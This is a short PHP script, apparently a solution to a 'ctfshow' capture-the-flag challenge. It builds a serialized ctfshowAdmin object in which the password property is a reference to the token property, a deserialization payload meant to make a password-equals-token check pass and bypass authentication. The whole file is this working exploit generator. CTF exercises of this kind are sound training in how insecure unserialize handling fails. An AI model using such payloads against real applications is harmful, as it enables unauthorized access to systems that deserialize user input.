<?php
class ctfshowAdmin{
    public $token;
    public $password = ["sss"];
}
$a = new ctfshowAdmin();
$a->password=&$a->token;
echo serialize($a);
